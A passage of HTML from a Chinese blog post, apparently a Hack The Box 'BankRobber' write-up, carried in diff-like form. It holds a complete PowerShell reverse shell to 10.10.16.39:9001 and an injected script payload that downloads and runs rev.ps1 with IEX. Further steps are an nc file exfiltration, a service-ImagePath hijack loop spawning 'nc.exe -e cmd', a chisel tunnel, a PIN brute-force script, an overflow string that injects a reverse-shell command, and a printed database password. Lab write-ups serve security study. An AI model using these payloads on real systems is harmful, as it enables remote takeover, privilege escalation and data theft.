class="hljs-string">&#x27;10.10.16.39&#x27;</span>, <span class="hljs-number">9001</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$socket</span> <span class="hljs-operator">-eq</span> <span class="hljs-variable">$null</span>)&#123;<span class="hljs-keyword">exit</span> <span class="hljs-number">1</span>&#125;<br><span class="hljs-variable">$stream</span> = <span class="hljs-variable">$socket</span>.GetStream();<br><span class="hljs-variable">$writer</span> = <span class="hljs-built_in">new-object</span> System.IO.StreamWriter(<span class="hljs-variable">$stream</span>);<br><span class="hljs-variable">$buffer</span> = <span class="hljs-built_in">new-object</span> System.Byte[] <span class="hljs-number">1024</span>;<br><span class="hljs-variable">$encoding</span> = <span class="hljs-built_in">new-object</span> System.Text.AsciiEncoding;<br><span class="hljs-keyword">do</span><br>&#123;<br>	<span class="hljs-variable">$writer</span>.Flush();<br>	<span class="hljs-variable">$read</span> = <span class="hljs-variable">$null</span>;<br>	<span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span><br>	<span class="hljs-keyword">while</span>(<span class="hljs-variable">$stream</span>.DataAvailable <span class="hljs-operator">-or</span> <span class="hljs-variable">$read</span> <span class="hljs-operator">-eq</span> <span class="hljs-variable">$null</span>) &#123;<br>		<span class="hljs-variable">$read</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$buffer</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1024</span>)<br>	&#125;<br>	<span class="hljs-variable">$out</span> = <span class="hljs-variable">$encoding</span>.GetString(<span class="hljs-variable">$buffer</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$read</span>).Replace(<span class="hljs-string">&quot;`r`n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>).Replace(<span class="hljs-string">&quot;`n&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>	<span class="hljs-keyword">if</span>(!<span class="hljs-variable">$out</span>.equals(<span class="hljs-string">&quot;exit&quot;</span>))&#123;<br>		<span class="hljs-variable">$args</span> = <span class="hljs-string">&quot;&quot;</span>;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$out</span>.IndexOf(<span class="hljs-string">&#x27; &#x27;</span>) <span class="hljs-operator">-gt</span> <span class="hljs-literal">-1</span>)&#123;<br>			<span class="hljs-variable">$args</span> = <span class="hljs-variable">$out</span>.substring(<span class="hljs-variable">$out</span>.IndexOf(<span class="hljs-string">&#x27; &#x27;</span>)+<span class="hljs-number">1</span>);<br>			<span class="hljs-variable">$out</span> = <span class="hljs-variable">$out</span>.substring(<span class="hljs-number">0</span>,<span class="hljs-variable">$out</span>.IndexOf(<span class="hljs-string">&#x27; &#x27;</span>));<br>			<span class="hljs-keyword">if</span>(<span class="hljs-variable">$args</span>.split(<span class="hljs-string">&#x27; &#x27;</span>).length <span class="hljs-operator">-gt</span> <span class="hljs-number">1</span>)&#123;<br>                <span class="hljs-variable">$pinfo</span> = <span class="hljs-built_in">New-Object</span> System.Diagnostics.ProcessStartInfo<br>                <span class="hljs-variable">$pinfo</span>.FileName = <span class="hljs-string">&quot;cmd.exe&quot;</span><br>                <span class="hljs-variable">$pinfo</span>.RedirectStandardError = <span class="hljs-variable">$true</span><br>                <span class="hljs-variable">$pinfo</span>.RedirectStandardOutput = <span class="hljs-variable">$true</span><br>                <span class="hljs-variable">$pinfo</span>.UseShellExecute = <span class="hljs-variable">$false</span><br>                <span class="hljs-variable">$pinfo</span>.Arguments = <span class="hljs-string">&quot;/c <span class="hljs-variable">$out</span> <span class="hljs-variable">$args</span>&quot;</span><br>                <span class="hljs-variable">$p</span> = <span class="hljs-built_in">New-Object</span> System.Diagnostics.Process<br>                <span class="hljs-variable">$p</span>.StartInfo = <span class="hljs-variable">$pinfo</span><br>                <span class="hljs-variable">$p</span>.Start() | <span class="hljs-built_in">Out-Null</span><br>                <span class="hljs-variable">$p</span>.WaitForExit()<br>                <span class="hljs-variable">$stdout</span> = <span class="hljs-variable">$p</span>.StandardOutput.ReadToEnd()<br>                <span class="hljs-variable">$stderr</span> = <span class="hljs-variable">$p</span>.StandardError.ReadToEnd()<br>                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$p</span>.ExitCode <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$stderr</span><br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$stdout</span><br>                &#125;<br>			&#125;<br>			<span class="hljs-keyword">else</span>&#123;<br>				<span class="hljs-variable">$res</span> = (&amp;<span class="hljs-string">&quot;<span class="hljs-variable">$out</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$args</span>&quot;</span>) | <span class="hljs-built_in">out-string</span>;<br>			&#125;<br>		&#125;<br>		<span class="hljs-keyword">else</span>&#123;<br>			<span class="hljs-variable">$res</span> = (&amp;<span class="hljs-string">&quot;<span class="hljs-variable">$out</span>&quot;</span>) | <span class="hljs-built_in">out-string</span>;<br>		&#125;<br>		<span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span> <span class="hljs-operator">-ne</span> <span class="hljs-variable">$null</span>)&#123;<br>        <span class="hljs-variable">$writer</span>.WriteLine(<span class="hljs-variable">$res</span>)<br>    &#125;<br>	&#125;<br>&#125;<span class="hljs-keyword">While</span> (!<span class="hljs-variable">$out</span>.equals(<span class="hljs-string">&quot;exit&quot;</span>))<br><span class="hljs-variable">$writer</span>.close();<br><span class="hljs-variable">$socket</span>.close();<br><span class="hljs-variable">$stream</span>.Dispose()<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">callSys</span>(<span class="hljs-string">&quot;dir | powershell IEX(New-Object Net.WebClient).DownloadString(&#x27;http://10.10.16.39/rev.ps1&#x27;)&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>即可反弹shell</p>
+<h3 id="提权1"><a href="#提权1" class="headerlink" title="提权1"></a>提权1</h3><p>先看mysql数据库密码</p>
+<p><img src="/../imgs/image-20250208002250625.png" srcset="/img/loading.gif" lazyload alt="image-20250208002250625"></p>
+<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">root<br>Welkom1!<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250208002334166.png" srcset="/img/loading.gif" lazyload alt="image-20250208002334166"></p>
+<p>尝试下载下来分析</p>
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-name">C</span>:\Users\Cortin\AppData\Local\Temp\n.exe <span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.39</span> <span class="hljs-number">1234</span> &lt; bankv2.exe<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250208140409931.png" srcset="/img/loading.gif" lazyload alt="image-20250208140409931"></p>
+<p><img src="/../imgs/image-20250208140417058.png" srcset="/img/loading.gif" lazyload alt="image-20250208140417058"></p>
+<p><img src="/../imgs/image-20250208140439074.png" srcset="/img/loading.gif" lazyload alt="image-20250208140439074"></p>
+<p>都是拒绝访问</p>
+<p><img src="/../imgs/image-20250208140706197.png" srcset="/img/loading.gif" lazyload alt="image-20250208140706197"></p>
+<p>利用收集到的密码喷洒下</p>
+<p><img src="/../imgs/image-20250208141102460.png" srcset="/img/loading.gif" lazyload alt="image-20250208141102460"></p>
+<p>失败</p>
+<p>批量劫持服务</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$services</span> = <span class="hljs-built_in">Get-Service</span> | <span class="hljs-built_in">Select-Object</span> <span class="hljs-literal">-ExpandProperty</span> Name<br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$service</span> <span class="hljs-keyword">in</span> <span class="hljs-variable">$services</span>) &#123; <br>  <span class="hljs-variable">$sddl</span> = (cmd /c <span class="hljs-built_in">sc</span> sdshow <span class="hljs-variable">$service</span>)[<span class="hljs-number">1</span>]; <br>  <span class="hljs-variable">$reg</span> = <span class="hljs-built_in">gp</span> <span class="hljs-literal">-path</span> hklm:\system\currentcontrolset\services\<span class="hljs-variable">$service</span>; <br>  <span class="hljs-keyword">if</span> (<span class="hljs-variable">$sddl</span> <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;RP[A-Z]*?;;;AU&quot;</span> <span class="hljs-operator">-and</span> <span class="hljs-variable">$reg</span>.ObjectName <span class="hljs-operator">-eq</span> <span class="hljs-string">&quot;LocalSystem&quot;</span>) &#123; <br>    <span class="hljs-built_in">write-host</span> <span class="hljs-string">&quot;Trying to hijack <span class="hljs-variable">$service</span>&quot;</span>; <br>    <span class="hljs-variable">$old_path</span> = (<span class="hljs-built_in">get-itemproperty</span> HKLM:\system\currentcontrolset\services\wuauserv).ImagePath; <br>    <span class="hljs-built_in">set-itemproperty</span> <span class="hljs-literal">-erroraction</span> silentlycontinue <span class="hljs-literal">-path</span> HKLM:\system\currentcontrolset\services\<span class="hljs-variable">$service</span> <span class="hljs-literal">-name</span> imagepath <span class="hljs-literal">-value</span> <span class="hljs-string">&quot;\programdata\nc.exe -e cmd 10.10.16.39 9003&quot;</span>; <br>    <span class="hljs-built_in">start-service</span> <span class="hljs-variable">$service</span> <span class="hljs-literal">-erroraction</span> silentlycontinue; <br>    <span class="hljs-built_in">set-itemproperty</span> <span class="hljs-literal">-path</span> HKLM:\system\currentcontrolset\services\<span class="hljs-variable">$service</span> <span class="hljs-literal">-name</span> imagepath <span class="hljs-literal">-value</span> <span class="hljs-variable">$old_path</span> <br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250208141330571.png" srcset="/img/loading.gif" lazyload alt="image-20250208141330571"></p>
+<p><img src="/../imgs/image-20250208141316464.png" srcset="/img/loading.gif" lazyload alt="image-20250208141316464"></p>
+<p>失败</p>
+<p>我们看看bankv2这个可执行文件是否正在系统中运行</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">cmd</span><span class="language-bash"> /c <span class="hljs-string">&quot;tasklist | findstr bank&quot;</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250208142927525.png" srcset="/img/loading.gif" lazyload alt="image-20250208142927525"></p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">netstat -ano</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250208142949987.png" srcset="/img/loading.gif" lazyload alt="image-20250208142949987"></p>
+<p>可以看到确实在运行</p>
+<p><img src="/../imgs/image-20250208143012948.png" srcset="/img/loading.gif" lazyload alt="image-20250208143012948"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">c</span>:\programdata\nc.exe <span class="hljs-number">127.0.0.1</span> <span class="hljs-number">910</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250208143419331.png" srcset="/img/loading.gif" lazyload alt="image-20250208143419331"></p>
+<p>有点卡，转发出来</p>
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs axapta">kali:<br>./chisel <span class="hljs-keyword">server</span> -p <span class="hljs-number">9000</span> --<span class="hljs-keyword">reverse</span><br>windows:<br>.\ci.exe <span class="hljs-keyword">client</span> <span class="hljs-number">10.10</span><span class="hljs-number">.16</span><span class="hljs-number">.39</span>:<span class="hljs-number">9000</span> R:<span class="hljs-number">8888</span>:<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">910</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250208151150588.png" srcset="/img/loading.gif" lazyload alt="image-20250208151150588"></p>
+<p>我们写脚本破解</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><br><span class="hljs-comment"># 目标主机和端口</span><br>HOST=<span class="hljs-string">&quot;127.0.0.1&quot;</span><br>PORT=<span class="hljs-string">&quot;8888&quot;</span><br><br><span class="hljs-comment"># 从0000到9999依次测试</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;开始从 0000 测试到 9999...&quot;</span><br><br><span class="hljs-keyword">for</span> PIN <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">seq</span> -w 0000 9999); <span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;尝试 PIN: <span class="hljs-variable">$PIN</span>&quot;</span><br><br>    <span class="hljs-comment"># 发送 PIN 到目标服务器</span><br>    RESPONSE=$(<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$PIN</span>&quot;</span> | nc <span class="hljs-string">&quot;<span class="hljs-variable">$HOST</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$PORT</span>&quot;</span> 2&gt;/dev/null)<br><br>    <span class="hljs-comment"># 检查服务器响应</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$RESPONSE</span>&quot;</span> | grep -q <span class="hljs-string">&quot;Access denied&quot;</span>; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PIN <span class="hljs-variable">$PIN</span> -&gt; Access denied&quot;</span><br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;PIN <span class="hljs-variable">$PIN</span> -&gt; 成功！响应内容: <span class="hljs-variable">$RESPONSE</span>&quot;</span><br>        <span class="hljs-built_in">exit</span> 0  <span class="hljs-comment"># 退出程序</span><br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;所有 PIN 代码已尝试完，没有找到正确的 PIN。&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250208165711994.png" srcset="/img/loading.gif" lazyload alt="image-20250208165711994"></p>
+<p>最终发现是0021</p>
+<p>然后需要继续输入，这里需要用到溢出，举例,一开始输入</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">qwertyuiopasdfghjklzxcvbnm</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250208165820341.png" srcset="/img/loading.gif" lazyload alt="image-20250208165820341"></p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnm</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250208165904094.png" srcset="/img/loading.gif" lazyload alt="image-20250208165904094"></p>
+<p>现在考虑溢出到我们的恶意代码,注意试了一次后就要恢复靶机</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">qwertyuiopasdfghjklzxcvbnmqwerty</span>\programdata\nc.exe -e cmd <span class="hljs-number">10.10.16.39</span> <span class="hljs-number">9004</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/../imgs/image-20250208173412720.png" srcset="/img/loading.gif" lazyload alt="image-20250208173412720"></p>
+<p><img src="/../imgs/image-20250208173401804.png" srcset="/img/loading.gif" lazyload alt="image-20250208173401804"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/HTB/" class="category-chain-item">HTB</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>BankRobber</div>
+      <div>http://example.com/2025/02/08/BankRobber/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>0xptS3</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年2月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/01/22/BreadCrumbs/" title="BreadCrumbs">
+                        <span class="hidden-mobile">BreadCrumbs</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
